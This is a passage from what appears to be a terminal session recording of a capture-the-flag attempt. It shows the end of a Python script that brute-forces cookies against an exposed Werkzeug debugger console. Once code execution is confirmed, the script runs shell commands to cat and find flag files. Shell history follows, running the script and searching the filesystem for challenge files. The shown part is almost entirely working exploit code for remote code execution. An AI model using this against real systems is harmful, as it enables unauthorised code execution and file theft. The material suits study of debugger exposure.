[1521.819968, "o", "            r2 = requests.get(url, params={\"__debugger__\": \"yes\", \"cmd\": \"print('WINNER_99')\", \"frm\": \"0\", \"s\": secret}, headers={\"Host\": \"localhost\"}, cookies={k: v})\r\n            if 'WINNER_99' in r2.text:\r\n                print(f\"\\n[!] EXPLOITED VIA COOKIE: {k}={v}\")\r\n                cmd = \"import os; print('=== FLAG ==='); print(os.popen('cat /flag.txt 2>/dev/null; cat /app/flags.txt 2>/dev/null; find / -name \\\"*flag*\\\" -not -path \\\"*/proc/*\\\" 2>/dev/null | xargs -r cat').read())\"\r\n                r3 = requests.get(url, params={\"__debugger__\": \"yes\", \"cmd\": cmd, \"frm\": \"0\", \"s\": secret}, headers={\"Host\": \"localhost\"}, cookies={k: v})\r\n                print(r3.text)\r\n                return True\r\n    return False\r\n\r\nwith concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:\r\n    for res in ex.map(test_chunk, chunks):\r\n        pass\r\nEOF\r\n\r\n   88  python3 cookie_blaster3.py\r\n   89  env\r\n   90  find / -type f -name \"*bot*\" -not -path \"*/proc/*\" -not -path \"*/sys/*\" -not -path \"*usr/share*\" -not -path \"*usr/lib*\" 2>/dev/null\r\n   91  find / -type f -name \"*urmom*\" -not -path \"*/proc/*\" -not -path \"*/sys/*\" 2>/dev/null\r\n   92  find / -type f -name \"*challenge*\" -not -path \"*/proc/*\" -not -path \"*/sys/*\" 2>/dev/null\r\n   93  history | tail -n 20\r\n"]
